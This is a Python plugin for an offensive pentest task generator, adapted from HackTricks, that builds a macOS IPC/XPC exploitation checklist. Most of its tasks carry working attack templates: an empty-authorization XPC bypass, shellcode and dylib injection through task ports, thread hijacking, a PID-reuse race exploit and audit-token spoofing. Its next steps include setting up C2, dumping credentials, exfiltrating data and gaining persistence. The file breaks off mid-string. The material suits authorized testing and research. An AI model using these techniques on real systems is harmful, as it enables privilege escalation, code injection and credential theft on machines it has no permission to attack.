"""
macOS IPC & XPC Exploitation plugin

Generates comprehensive tasks for macOS inter-process communication exploitation including:
- Mach port enumeration and manipulation
- XPC service discovery and analysis
- Task port exploitation (shellcode/dylib injection, thread hijacking)
- MIG (Mach Interface Generator) analysis
- XPC authorization bypass techniques
- Race condition exploitation (PID reuse, audit token spoofing)
- Privileged port identification
- File port and distributed objects attacks

Extracted from HackTricks: macos-ipc-inter-process-communication/
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class MacOSIPCPlugin(ServicePlugin):
    """macOS IPC/XPC exploitation plugin for privilege escalation"""

    @property
    def name(self) -> str:
        return "macos-ipc"

    @property
    def default_ports(self) -> List[int]:
        return []  # No network ports - local IPC mechanisms

    @property
    def service_names(self) -> List[str]:
        return ['macos', 'darwin', 'xpc', 'mach', 'ipc']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """Detect macOS IPC enumeration opportunities"""
        # This plugin is triggered manually for macOS targets
        # or auto-detected via OS fingerprinting
        os_info = port_info.get('os', '').lower()
        product = port_info.get('product', '').lower()

        # Check for macOS indicators
        if any(indicator in os_info for indicator in ['darwin', 'macos', 'mac os']):
            return True

        if any(indicator in product for indicator in ['darwin', 'macos']):
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate macOS IPC exploitation task tree"""

        tasks = {
            'id': 'macos-ipc-root',
            'name': f'macOS IPC/XPC Exploitation ({target})',
            'type': 'parent',
            'children': []
        }

        # ============================================================
        # PHASE 1: Mach Port Discovery & Enumeration
        # ============================================================
        mach_port_tasks = {
            'id': 'mach-port-enum',
            'name': 'Mach Port Enumeration',
            'type': 'parent',
            'children': []
        }

        # Task 1.1: Enumerate process ports with lsmp
        mach_port_tasks['children'].append({
            'id': 'lsmp-enum',
            'name': 'Enumerate Mach Ports (lsmp)',
            'type': 'command',
            'metadata': {
                'command': f'lsmp -p <PID>',
                'description': 'List all Mach ports for a target process (requires process ID)',
                'tags': ['OSCP:HIGH', 'ENUM', 'MANUAL', 'MACOS'],
                'flag_explanations': {
                    'lsmp': 'List Mach ports - shows port names, rights, and connections',
                    '-p': 'Target process ID to enumerate'
                },
                'success_indicators': [
                    'Port list displayed with ipc-object identifiers',
                    'Send/receive rights visible for each port',
                    'Connected tasks shown with + prefix'
                ],
                'failure_indicators': [
                    'Permission denied - need root or same user',
                    'Invalid PID - process not found'
                ],
                'next_steps': [
                    'Identify privileged ports (HOST_PRIV_PORT, TASK_KERNEL_PORT)',
                    'Look for XPC service ports with send rights',
                    'Check for bootstrap server registered services'
                ],
                'alternatives': [
                    'sudo lsmp -p 1  # Enumerate launchd ports (requires root)',
                    'procexp <PID> ports  # Alternative tool with service names (SIP disabled)',
                    'Manual: use task_for_pid() + mach_port_names() in C code'
                ],
                'notes': 'Port names are obfuscated identifiers. Cross-reference with service names using procexp or launchd plist files in /Library/LaunchDaemons'
            }
        })

        # Task 1.2: Enumerate host special ports
        mach_port_tasks['children'].append({
            'id': 'host-special-ports',
            'name': 'Enumerate Host Special Ports',
            'type': 'command',
            'metadata': {
                'command': f'procexp all ports | grep "HSP"',
                'description': 'List host special ports (privileged kernel-managed ports)',
                'tags': ['OSCP:MEDIUM', 'ENUM', 'MACOS'],
                'flag_explanations': {
                    'procexp': 'Process explorer tool from newosxbook.com/tools',
                    'all': 'Query all processes',
                    'ports': 'Show port information',
                    'HSP': 'Filter for Host Special Ports'
                },
                'success_indicators': [
                    'HOST_PORT, HOST_PRIV_PORT visible',
                    'HOST_IO_MASTER_PORT identified',
                    'Privileged ports enumerated'
                ],
                'failure_indicators': [
                    'procexp not installed',
                    'SIP prevents access - need com.apple.system-task-port entitlement'
                ],
                'next_steps': [
                    'Check if process has send rights to host_priv_port',
                    'Analyze host special ports 8+ (daemon-owned)',
                    'Research privilege escalation via host port access'
                ],
                'alternatives': [
                    'Install procexp: http://newosxbook.com/tools/procexp.html',
                    'Manual: Call host_get_special_port() from C code',
                    'Review /usr/share/xnu/osfmk/mach/host_special_ports.h for port IDs'
                ],
                'notes': 'Host ports require root for access. Ports 1-7 are kernel-owned, 8+ are daemon-owned. SIP must be disabled for full enumeration.'
            }
        })

        # Task 1.3: Enumerate XPC services
        mach_port_tasks['children'].append({
            'id': 'xpc-service-discovery',
            'name': 'Discover XPC Services',
            'type': 'command',
            'metadata': {
                'command': f'find /Library/LaunchDaemons /Library/LaunchAgents /System/Library/LaunchDaemons /System/Library/LaunchAgents -name "*.plist" -exec grep -l "MachServices" {{}} \\;',
                'description': 'Find all XPC service plist files with Mach service definitions',
                'tags': ['OSCP:HIGH', 'ENUM', 'MACOS', 'QUICK_WIN'],
                'flag_explanations': {
                    'find': 'Search filesystem for plist files',
                    '/Library/LaunchDaemons': 'System-wide daemons (run as root)',
                    '/Library/LaunchAgents': 'Per-user agents',
                    '-name "*.plist"': 'Target launchd configuration files',
                    'grep -l "MachServices"': 'Find plists defining Mach services'
                },
                'success_indicators': [
                    'List of XPC service plist files',
                    'MachServices keys found',
                    'Program paths to XPC binaries visible'
                ],
                'failure_indicators': [
                    'Permission denied on /System (SIP-protected)',
                    'No plist files found'
                ],
                'next_steps': [
                    'Parse plist files for service names: plutil -p <plist>',
                    'Identify root-run services in LaunchDaemons (privesc targets)',
                    'Extract MachServices names for connection attempts',
                    'Locate binary paths for reverse engineering'
                ],
                'alternatives': [
                    'sudo launchctl list | grep -i <service>  # Check loaded services',
                    'plutil -p /Library/LaunchDaemons/*.plist | grep -A5 MachServices',
                    'Manual: Review /Library/LaunchDaemons/*.plist for service definitions'
                ],
                'notes': 'Services in /Library/LaunchDaemons run as root - high-value privesc targets. Check for weak XPC authorization.'
            }
        })

        tasks['children'].append(mach_port_tasks)

        # ============================================================
        # PHASE 2: XPC Service Analysis & Exploitation
        # ============================================================
        xpc_analysis_tasks = {
            'id': 'xpc-analysis',
            'name': 'XPC Service Analysis',
            'type': 'parent',
            'children': []
        }

        # Task 2.1: Analyze XPC authorization
        xpc_analysis_tasks['children'].append({
            'id': 'xpc-auth-check',
            'name': 'Analyze XPC Authorization Checks',
            'type': 'command',
            'metadata': {
                'command': f'class-dump /Library/PrivilegedHelperTools/<HELPER_BINARY>',
                'description': 'Dump Objective-C headers to identify XPC protocol and authorization',
                'tags': ['OSCP:HIGH', 'RECON', 'MACOS'],
                'flag_explanations': {
                    'class-dump': 'Extract Objective-C class/protocol definitions from binary',
                    '/Library/PrivilegedHelperTools/': 'Common location for privileged XPC helpers'
                },
                'success_indicators': [
                    '@protocol definitions visible',
                    'Method signatures with authorization parameters',
                    'shouldAcceptNewConnection method found'
                ],
                'failure_indicators': [
                    'Binary is stripped - no class info',
                    'Not an Objective-C binary (pure C/Swift)'
                ],
                'next_steps': [
                    'Check if shouldAcceptNewConnection always returns YES',
                    'Look for EvenBetterAuthorizationSample pattern',
                    'Identify authorization right names (com.example.*.right)',
                    'Query /var/db/auth.db for right permissions'
                ],
                'alternatives': [
                    'Hopper/IDA: Decompile shouldAcceptNewConnection function',
                    'strings <binary> | grep -i "authorization"  # Find auth strings',
                    'nm <binary> | grep -i "authorization"  # Check for auth symbols',
                    'otool -L <binary>  # Check for libxpc.dylib dependency'
                ],
                'notes': 'Look for checkAuthorization:command: method - indicates EvenBetterAuthorizationSample usage. Weak checks allow unprivileged XPC calls.'
            }
        })

        # Task 2.2: Query authorization database
        xpc_analysis_tasks['children'].append({
            'id': 'auth-db-query',
            'name': 'Query Authorization Database',
            'type': 'command',
            'metadata': {
                'command': f'sudo sqlite3 /var/db/auth.db "SELECT name FROM rules WHERE name LIKE \'%<SERVICE>%\';"',
                'description': 'Find authorization rules for target XPC service',
                'tags': ['OSCP:HIGH', 'ENUM', 'MACOS'],
                'flag_explanations': {
                    'sqlite3': 'Query authorization rights database',
                    '/var/db/auth.db': 'System authorization database',
                    'rules': 'Table containing authorization right definitions',
                    'LIKE': 'Wildcard search for service-related rights'
                },
                'success_indicators': [
                    'Authorization right names listed',
                    'Service-specific rights found'
                ],
                'failure_indicators': [
                    'No matching rules - service may not use auth DB',
                    'Permission denied (need root)'
                ],
                'next_steps': [
                    'Read right details: security authorizationdb read <RIGHT_NAME>',
                    'Check for "authenticate-user": false (no auth required)',
                    'Look for "session-owner": true (auto-granted to logged-in user)',
                    'Identify rights with "allow-root": true (root bypass)'
                ],
                'alternatives': [
                    'security authorizationdb read <RIGHT_NAME>  # Read specific right',
                    'Script: https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9',
                    'Manual: Parse /var/db/auth.db with sqlite3 browser'
                ],
                'notes': 'Permissive combinations: authenticate-user=false + session-owner=true = auto-granted. Check for kAuthorizationRuleClassAllow (anyone).'
            }
        })

        # Task 2.3: XPC connection testing
        xpc_analysis_tasks['children'].append({
            'id': 'xpc-connect-test',
            'name': 'Test XPC Service Connection',
            'type': 'manual',
            'metadata': {
                'command': 'N/A - Manual code required',
                'description': 'Attempt to establish XPC connection and call methods',
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'MACOS'],
                'notes': '''
Objective-C XPC Client Template:
-------------------------------
#import <Foundation/Foundation.h>

@protocol TargetProtocol
- (void)privilegedMethod:(void (^)(NSError *))reply;
@end

int main() {
    NSXPCConnection *conn = [[NSXPCConnection alloc]
        initWithMachServiceName:@"com.example.service"
        options:NSXPCConnectionPrivileged];

    conn.remoteObjectInterface = [NSXPCInterface
        interfaceWithProtocol:@protocol(TargetProtocol)];
    [conn resume];

    [[conn remoteObjectProxy] privilegedMethod:^(NSError *err) {
        NSLog(@"Result: %@", err);
    }];

    [[NSRunLoop currentRunLoop] run];
    return 0;
}

Compile: gcc -framework Foundation client.m -o client

Authorization Bypass (if EvenBetterAuthorizationSample):
--------------------------------------------------------
AuthorizationRef authRef;
AuthorizationExternalForm authForm;
AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, 0, &authRef);
AuthorizationMakeExternalForm(authRef, &authForm);
NSData *authData = [NSData dataWithBytes:&authForm length:sizeof(authForm)];

// Pass empty auth to privileged method
[[conn remoteObjectProxy] methodWithAuth:authData reply:^(NSError *e) {...}];
''',
                'success_indicators': [
                    'XPC connection established',
                    'Method called without authorization prompt',
                    'Privileged action executed'
                ],
                'failure_indicators': [
                    'Connection rejected - authorization check failed',
                    'Authorization prompt appears',
                    'Method not found - incorrect protocol definition'
                ],
                'next_steps': [
                    'If successful: exploit privileged methods',
                    'If auth required: check for PID reuse vulnerability',
                    'If auth required: check for audit token spoofing',
                    'Document exploitable methods for writeup'
                ]
            }
        })

        # Task 2.4: XPC message sniffing
        xpc_analysis_tasks['children'].append({
            'id': 'xpc-sniff',
            'name': 'Sniff XPC Messages',
            'type': 'command',
            'metadata': {
                'command': f'xpcspy -U -r -W <BUNDLE_ID>',
                'description': 'Intercept and log XPC messages using Frida-based tool',
                'tags': ['OSCP:MEDIUM', 'RECON', 'MACOS', 'AUTOMATED'],
                'flag_explanations': {
                    'xpcspy': 'Frida-based XPC message sniffer',
                    '-U': 'Attach to USB device (iOS) or local (macOS)',
                    '-r': 'Show replies to XPC messages',
                    '-W': 'Wait for app to launch with bundle ID'
                },
                'success_indicators': [
                    'XPC messages logged in real-time',
                    'Message contents and arguments visible',
                    'Service names and methods captured'
                ],
                'failure_indicators': [
                    'xpcspy not installed - pip3 install xpcspy',
                    'SIP prevents Frida injection',
                    'Target app not using XPC'
                ],
                'next_steps': [
                    'Analyze captured messages for sensitive data',
                    'Identify authentication tokens or credentials',
                    'Map complete XPC API surface',
                    'Craft replay attacks with captured messages'
                ],
                'alternatives': [
                    'pip3 install xpcspy  # Install tool',
                    'xpcspy -U <app> -t "i:com.apple.*"  # Filter input messages',
                    'XPoCe2: http://newosxbook.com/tools/XPoCe2.html',
                    'Manual: Frida script to hook xpc_connection_send_message'
                ],
                'notes': 'Requires SIP disabled or app with com.apple.security.get-task-allow entitlement. Use filters to reduce noise: -t "i:service.*"'
            }
        })

        tasks['children'].append(xpc_analysis_tasks)

        # ============================================================
        # PHASE 3: Task Port Exploitation
        # ============================================================
        task_port_exploit = {
            'id': 'task-port-exploit',
            'name': 'Task Port Exploitation',
            'type': 'parent',
            'children': []
        }

        # Task 3.1: Get task port
        task_port_exploit['children'].append({
            'id': 'task-for-pid',
            'name': 'Acquire Task Port (task_for_pid)',
            'type': 'manual',
            'metadata': {
                'command': 'N/A - Code required',
                'description': 'Obtain SEND right to target process task port for memory/thread control',
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'MACOS'],
                'notes': '''
C Code to Get Task Port:
------------------------
#include <mach/mach.h>

task_t task;
kern_return_t kr = task_for_pid(mach_task_self(), TARGET_PID, &task);
if (kr != KERN_SUCCESS) {
    printf("Failed: %s\\n", mach_error_string(kr));
    // Try processor_set_tasks workaround (root only):
    // host_processor_set_priv() + processor_set_tasks()
}

Task Port Restrictions:
-----------------------
1. com.apple.security.get-task-allow entitlement (DEBUG builds only)
2. com.apple.system-task-ports (Apple apps only)
3. Root can access non-hardened runtime apps
4. Same user can access apps with get-task-allow

Workaround (Root Only):
-----------------------
mach_port_t host = mach_host_self();
mach_port_t priv_set;
host_processor_set_priv(host, default_set, &priv_set);

task_array_t tasks;
mach_msg_type_number_t count;
processor_set_tasks(priv_set, &tasks, &count);

// Enumerate all tasks, find target by PID using pid_for_task()
''',
                'success_indicators': [
                    'task_for_pid returns KERN_SUCCESS',
                    'Valid task port obtained',
                    'Can call task_threads(), task_info()'
                ],
                'failure_indicators': [
                    'KERN_FAILURE - insufficient permissions',
                    'Target has hardened runtime',
                    'SIP prevents access to system processes'
                ],
                'next_steps': [
                    'Use task port for memory read/write (vm_read/vm_write)',
                    'Inject shellcode via thread hijacking',
                    'Inject dylib via thread creation',
                    'Enumerate threads with task_threads()'
                ],
                'alternatives': [
                    'processor_set_tasks() workaround (root, see code above)',
                    'Exploit XPC service to get task port via delegation',
                    'Use lldb/debugger: lldb -p <PID> (requires entitlement)'
                ]
            }
        })

        # Task 3.2: Shellcode injection
        task_port_exploit['children'].append({
            'id': 'shellcode-inject',
            'name': 'Shellcode Injection via Task Port',
            'type': 'manual',
            'metadata': {
                'command': 'N/A - C code required',
                'description': 'Inject and execute shellcode in target process using task port',
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'MACOS', 'CODE_INJECTION'],
                'notes': '''
Shellcode Injection Steps:
---------------------------
1. Allocate remote memory:
   mach_vm_allocate(task, &remoteStack, STACK_SIZE, VM_FLAGS_ANYWHERE);
   mach_vm_allocate(task, &remoteCode, CODE_SIZE, VM_FLAGS_ANYWHERE);

2. Write shellcode:
   char shellcode[] = "\\xff\\x03\\x01\\xd1...";  // ARM64 shellcode
   mach_vm_write(task, remoteCode, (vm_offset_t)shellcode, sizeof(shellcode));

3. Set memory permissions:
   vm_protect(task, remoteCode, CODE_SIZE, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
   vm_protect(task, remoteStack, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

4. Create thread:
   arm_unified_thread_state remoteThreadState;
   remoteThreadState.ts_64.__pc = (u_int64_t)remoteCode;
   remoteThreadState.ts_64.__sp = (u_int64_t)(remoteStack + STACK_SIZE/2);

   thread_act_t remoteThread;
   thread_create_running(task, ARM_THREAD_STATE64,
       (thread_state_t)&remoteThreadState.ts_64,
       ARM_THREAD_STATE64_COUNT, &remoteThread);

Apple Silicon (ARM64e) PAC:
----------------------------
1. Allocate executable memory
2. Sign pointer inside target process:
   uint64_t ptr = (uint64_t)payload;
   ptr = ptrauth_sign_unauthenticated(ptr, ptrauth_key_asia, 0);
3. Set pc = ptr

Example: https://github.com/bazad/threadexec
Compile: gcc -framework Foundation inject.m -o inject
''',
                'success_indicators': [
                    'Remote memory allocated',
                    'Shellcode written to process',
                    'Thread created and executing',
                    'Payload effects visible (e.g., file created)'
                ],
                'failure_indicators': [
                    'mach_vm_allocate fails - insufficient permissions',
                    'thread_create_running blocked (SIP)',
                    'PAC violation crash on ARM64e'
                ],
                'next_steps': [
                    'Verify payload execution: check for /tmp/pwned file',
                    'Escalate to dylib injection for complex payloads',
                    'Use shared memory for data exfiltration',
                    'Clean up: deallocate remote memory, suspend thread'
                ],
                'alternatives': [
                    'Thread hijacking (no thread creation needed)',
                    'Dylib injection for complex functionality',
                    'ROP chain for PAC-protected environments'
                ]
            }
        })

        # Task 3.3: Dylib injection
        task_port_exploit['children'].append({
            'id': 'dylib-inject',
            'name': 'Dylib Injection via Task Port',
            'type': 'manual',
            'metadata': {
                'command': 'N/A - C code required',
                'description': 'Inject shared library into target process for advanced control',
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'MACOS', 'CODE_INJECTION'],
                'notes': '''
Dylib Injection Overview:
-------------------------
Shellcode limitations: Not POSIX-compliant, can't call complex APIs
Dylib advantages: Full library support, persistent hooks, complex logic

Injection Steps:
----------------
1. Create pthread in remote process:
   // Shellcode calls pthread_create_from_mach_thread()
   // to convert Mach thread to POSIX thread

2. Call dlopen() to load dylib:
   // Remote thread executes: dlopen("/path/to/payload.dylib", RTLD_NOW)

3. Dylib constructor executes:
   __attribute__((constructor))
   static void injected_main() {
       // Your code runs automatically when dylib loads
       NSLog(@"Injected into process!");
   }

Compile Payload Dylib:
----------------------
// payload.m
#import <Foundation/Foundation.h>

__attribute__((constructor))
static void pwn() {
    NSLog(@"Payload loaded in PID: %d", getpid());
    // Reverse shell, privilege escalation, etc.
    system("touch /tmp/pwned");
}

Compile: gcc -dynamiclib -framework Foundation payload.m -o payload.dylib

Injection Tool Usage:
---------------------
gcc -framework Foundation dylib_injector.m -o inject
./inject <PID> /path/to/payload.dylib

Example: http://newosxbook.com/src.jl?tree=listings&file=inject.c
''',
                'success_indicators': [
                    'dlopen() succeeds in remote process',
                    'Dylib constructor executes',
                    'Payload effects visible',
                    'Process continues running normally'
                ],
                'failure_indicators': [
                    'dlopen() fails - dylib not found or invalid',
                    'pthread_create_from_mach_thread fails',
                    'Process crashes - incompatible dylib'
                ],
                'next_steps': [
                    'Hook target functions with method swizzling',
                    'Establish C2 channel from injected dylib',
                    'Dump process memory or credentials',
                    'Persist via DYLD_INSERT_LIBRARIES'
                ],
                'alternatives': [
                    'DYLD_INSERT_LIBRARIES environment variable (limited)',
                    'LD_PRELOAD equivalent for macOS',
                    'Code signature bypass for unsigned dylibs'
                ]
            }
        })

        # Task 3.4: Thread hijacking
        task_port_exploit['children'].append({
            'id': 'thread-hijack',
            'name': 'Thread Hijacking',
            'type': 'manual',
            'metadata': {
                'command': 'N/A - C code required',
                'description': 'Hijack existing thread instead of creating new one (bypasses mitigations)',
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'MACOS', 'STEALTH'],
                'notes': '''
Why Thread Hijacking?
----------------------
thread_create_running() is blocked by some mitigations
Hijacking existing thread avoids detection

Thread Hijacking Steps:
-----------------------
1. Get thread list:
   thread_act_array_t threads;
   mach_msg_type_number_t count;
   task_threads(task, &threads, &count);

2. Suspend target thread:
   thread_suspend(threads[0]);

3. Get current state:
   arm_unified_thread_state state;
   thread_get_state(threads[0], ARM_THREAD_STATE64,
       (thread_state_t)&state, &count);

4. Modify registers:
   state.ts_64.__pc = (uint64_t)target_function;  // New PC
   state.ts_64.__x0 = arg1;  // Arguments in x0-x7
   state.ts_64.__lr = invalid_address;  // Trigger exception on return

5. Set exception handler:
   thread_set_exception_ports(thread, EXC_MASK_BAD_ACCESS,
       exception_port, ...);

6. Resume thread:
   thread_set_state(threads[0], ARM_THREAD_STATE64, ...);
   thread_resume(threads[0]);

7. Wait for exception (function returned)
8. Read return value from x0

Alternative: Set LR to infinite loop, poll PC until it reaches loop

Detection:
----------
task_info(task, TASK_EXTMOD_INFO, ...) increments counter
on thread_create_* and task_for_pid calls

Reference: https://github.com/bazad/threadexec
''',
                'success_indicators': [
                    'Thread suspended successfully',
                    'Registers modified',
                    'Function executed in target context',
                    'Return value captured'
                ],
                'failure_indicators': [
                    'thread_suspend fails - insufficient permissions',
                    'Exception not triggered - invalid LR',
                    'Process crashes - corrupted state'
                ],
                'next_steps': [
                    'Chain multiple function calls',
                    'Read/write memory using hijacked thread',
                    'Establish Mach port communication',
                    'Create shared memory for data transfer'
                ],
                'alternatives': [
                    'New thread creation (if not blocked)',
                    'ROP chain execution',
                    'Exception handler manipulation'
                ]
            }
        })

        tasks['children'].append(task_port_exploit)

        # ============================================================
        # PHASE 4: XPC Race Condition Attacks
        # ============================================================
        race_condition_attacks = {
            'id': 'xpc-race-conditions',
            'name': 'XPC Race Condition Exploitation',
            'type': 'parent',
            'children': []
        }

        # Task 4.1: PID reuse attack
        race_condition_attacks['children'].append({
            'id': 'pid-reuse-attack',
            'name': 'PID Reuse Attack',
            'type': 'manual',
            'metadata': {
                'command': 'N/A - Exploit code required',
                'description': 'Exploit race condition in XPC PID-based authentication',
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'MACOS', 'RACE_CONDITION'],
                'notes': '''
Vulnerability:
--------------
XPC service calls processIdentifier (returns PID) instead of
auditToken for client authentication. PID can be reused.

Attack Flow:
------------
1. Fork malicious process
2. Send privileged XPC request
3. Immediately exec() legitimate binary via posix_spawn()
4. XPC service checks PID AFTER exec()
5. Sees legitimate binary, allows request from step 2

Detection:
----------
Decompile shouldAcceptNewConnection in XPC service:
- Look for [connection processIdentifier] (VULNERABLE)
- Should use [connection auditToken] (SECURE)

Exploit Template:
-----------------
export OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES

void child() {
    // Connect to XPC service
    NSXPCConnection *conn = [[NSXPCConnection alloc]
        initWithMachServiceName:@"com.target.service"
        options:NSXPCConnectionPrivileged];
    [conn resume];

    // Send malicious request
    [[conn remoteObjectProxy] privilegedMethod:^(NSError *e) {
        NSLog(@"Pwned: %@", e);
    }];

    // Immediately replace process with legit binary
    char *args[] = {"/path/to/legit/binary", NULL};
    posix_spawnattr_t attr;
    posix_spawnattr_init(&attr);
    posix_spawnattr_setflags(&attr, POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
    posix_spawn(NULL, args[0], NULL, &attr, args, environ);
}

// Fork multiple times to win race
for (int i = 0; i < 32; i++) {
    if (fork() == 0) child();
}

Compile: gcc -framework Foundation exploit.m -o exploit

Reference: https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/
''',
                'success_indicators': [
                    'Privileged XPC method executed',
                    'No authorization prompt',
                    'Race condition won within ~32 attempts'
                ],
                'failure_indicators': [
                    'XPC service uses auditToken (not vulnerable)',
                    'Authorization denied',
                    'Fork rate-limited by system'
                ],
                'next_steps': [
                    'If successful: escalate privileges via XPC',
                    'Document vulnerable service for report',
                    'Check other XPC services for same pattern'
                ],
                'alternatives': [
                    'Audit token spoofing attack (different vulnerability)',
                    'Hard link race condition for signature checks',
                    'Direct binary exploitation if XPC unavailable'
                ]
            }
        })

        # Task 4.2: Audit token spoofing
        race_condition_attacks['children'].append({
            'id': 'audit-token-spoof',
            'name': 'Audit Token Spoofing (xpc_connection_get_audit_token)',
            'type': 'manual',
            'metadata': {
                'command': 'N/A - Complex exploit code required',
                'description': 'Exploit race condition in XPC audit token retrieval',
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'MACOS', 'RACE_CONDITION', 'ADVANCED'],
                'notes': '''
Vulnerability (CVE-style, unfixed in macOS 14/iOS 17):
-------------------------------------------------------
xpc_connection_get_audit_token() retrieves token from most recent
message on connection. Mach ports are multi-sender, single-receiver.
If called outside event handler (e.g., in dispatch_async), another
message can overwrite audit token during authorization check.

Variant 1: Async Authorization Check
-------------------------------------
1. Attacker connects to service A
2. Attacker connects privileged service B to service A
   (passes A's send right to B)
3. Trigger B to send messages to A (overwrites audit token)
4. Simultaneously send privileged request to A
5. Race: A checks auth while B's token is active
6. A sees B's privileged token, allows attacker's request

Requirements:
- Service A calls xpc_connection_get_audit_token in dispatch_async
- Service B has privileges A respects (e.g., root, entitlements)
- Can trigger B to send messages

Example (smd + diagnosticd):
- smd: System service that installs privileged helpers (SMJobBless)
- diagnosticd: Runs as root, sends frequent messages when monitoring
- Attacker: Pass smd connection to diagnosticd, win race

Variant 2: Reply Forwarding
----------------------------
1. Wait for A to send message expecting reply
2. Hijack reply port, send to service B instead
3. Send privileged request to A concurrently with B's reply
4. Race: B's reply overwrites audit token during request processing

Detection:
----------
Static: Search for xpc_connection_get_audit_token in dispatch_async
Dynamic: Frida hook to log calls outside event handlers

Fix:
----
Use xpc_dictionary_get_audit_token (private API) instead of
xpc_connection_get_audit_token. Retrieves token from message directly.

Reference: https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/
''',
                'success_indicators': [
                    'Successfully spoofed audit token',
                    'Privileged action executed without proper auth',
                    'Race condition won'
                ],
                'failure_indicators': [
                    'Service uses xpc_dictionary_get_audit_token (patched)',
                    'Authorization check in event handler (not vulnerable)',
                    'Unable to trigger privileged service B'
                ],
                'next_steps': [
                    'Document vulnerable service chain (A + B)',
                    'Craft reliable exploit with timing tuning',
                    'Report to Apple (still unfixed as of macOS 14)'
                ],
                'alternatives': [
                    'PID reuse attack (different vulnerability)',
                    'XPC authorization bypass via empty auth',
                    'Direct memory corruption if XPC unavailable'
                ]
            }
        })

        tasks['children'].append(race_condition_attacks)

        # ============================================================
        # PHASE 5: MIG Analysis
        # ============================================================
        mig_analysis = {
            'id': 'mig-analysis',
            'name': 'MIG (Mach Interface Generator) Analysis',
            'type': 'parent',
            'children': []
        }

        # Task 5.1: Identify MIG usage
        mig_analysis['children'].append({
            'id': 'mig-detection',
            'name': 'Detect MIG Usage in Binary',
            'type': 'command',
            'metadata': {
                'command': f'jtool2 -S <BINARY> | grep NDR',
                'description': 'Check if binary uses MIG (Mach Interface Generator) for IPC',
                'tags': ['OSCP:MEDIUM', 'RECON', 'MACOS'],
                'flag_explanations': {
                    'jtool2': 'Mach-O analysis tool by Jonathan Levin',
                    '-S': 'Show symbol table',
                    'grep NDR': 'Filter for _NDR_record (MIG indicator)'
                },
                'success_indicators': [
                    '_NDR_record symbol found',
                    'Binary uses MIG for IPC',
                    'Likely MIG client or server'
                ],
                'failure_indicators': [
                    'No _NDR_record - not using MIG',
                    'Binary stripped - symbols removed'
                ],
                'next_steps': [
                    'If MIG server: extract dispatch table with jtool2',
                    'If MIG client: identify remote service',
                    'Analyze MIG subsystem definitions',
                    'Map message IDs to handler functions'
                ],
                'alternatives': [
                    'nm <binary> | grep NDR  # Check symbols',
                    'strings <binary> | grep -i "mig"',
                    'otool -tV <binary> | grep mach_msg  # Look for IPC calls'
                ],
                'notes': '_NDR_record used for platform-agnostic data serialization. MIG servers have dispatch table in __DATA.__const segment.'
            }
        })

        # Task 5.2: Extract MIG dispatch table
        mig_analysis['children'].append({
            'id': 'mig-dispatch-extract',
            'name': 'Extract MIG Dispatch Table',
            'type': 'command',
            'metadata': {
                'command': f'jtool2 -d __DATA.__const <BINARY> | grep MIG',
                'description': 'Dump MIG message ID to function mappings',
                'tags': ['OSCP:MEDIUM', 'RECON', 'MACOS'],
                'flag_explanations': {
                    'jtool2': 'Mach-O analysis tool',
                    '-d': 'Disassemble/dump segment',
                    '__DATA.__const': 'Segment containing MIG dispatch table',
                    'grep MIG': 'Filter for MIG-related structures'
                },
                'success_indicators': [
                    'Message IDs and function pointers listed',
                    'Subsystem start/end IDs visible',
                    'Handler function addresses shown'
                ],
                'failure_indicators': [
                    'No MIG structures found',
                    'Segment not present in binary'
                ],
                'next_steps': [
                    'Map message IDs to function names',
                    'Decompile handler functions in IDA/Hopper',
                    'Identify vulnerable message handlers',
                    'Craft malicious MIG messages'
                ],
                'alternatives': [
                    'jtool2 -d __DATA.__const <binary> | grep BL  # Find function calls',
                    'Hopper/IDA: Analyze subsystem_to_name_map structure',
                    'Manual: Parse __DATA.__const with hex editor'
                ],
                'notes': 'MIG subsystem struct contains array of routine_descriptor (0x28 bytes each). First 8 bytes = function pointer. Message ID = subsystem_start + array_index.'
            }
        })

        # Task 5.3: Analyze MIG definitions
        mig_analysis['children'].append({
            'id': 'mig-defs-analysis',
            'name': 'Analyze MIG Definition Files',
            'type': 'command',
            'metadata': {
                'command': f'mdfind mach_port.defs',
                'description': 'Find MIG .defs files on system for protocol analysis',
                'tags': ['OSCP:LOW', 'RECON', 'MACOS'],
                'flag_explanations': {
                    'mdfind': 'Spotlight search from command line',
                    'mach_port.defs': 'Example MIG definition file'
                },
                'success_indicators': [
                    'MIG .defs files located',
                    'Subsystem definitions visible',
                    'RPC method signatures available'
                ],
                'failure_indicators': [
                    'No .defs files found (rare)',
                    'Only compiled MIG code available'
                ],
                'next_steps': [
                    'Read .defs files to understand MIG protocol',
                    'Compile .defs: mig -DLIBSYSCALL_INTERFACE file.defs',
                    'Analyze generated client/server code',
                    'Identify input validation weaknesses'
                ],
                'alternatives': [
                    'find /System -name "*.defs" 2>/dev/null',
                    'locate *.defs',
                    'Check /usr/include/mach/*.defs'
                ],
                'notes': 'MIG .defs define RPC interface. Subsystem ID range determines message IDs. Look for complex data types (potential deserialization bugs).'
            }
        })

        tasks['children'].append(mig_analysis)

        # ============================================================
        # PHASE 6: Advanced Techniques
        # ============================================================
        advanced_techniques = {
            'id': 'advanced-ipc-techniques',
            'name': 'Advanced IPC Techniques',
            'type': 'parent',
            'children': []
        }

        # Task 6.1: File port exploitation
        advanced_techniques['children'].append({
            'id': 'file-port-exploit',
            'name': 'File Port Exploitation',
            'type': 'manual',
            'metadata': {
                'command': 'N/A - Code required',
                'description': 'Transfer file descriptors via Mach ports (fileport)',
                'tags': ['OSCP:LOW', 'ADVANCED', 'MACOS'],
                'notes': '''
File Ports Overview:
--------------------
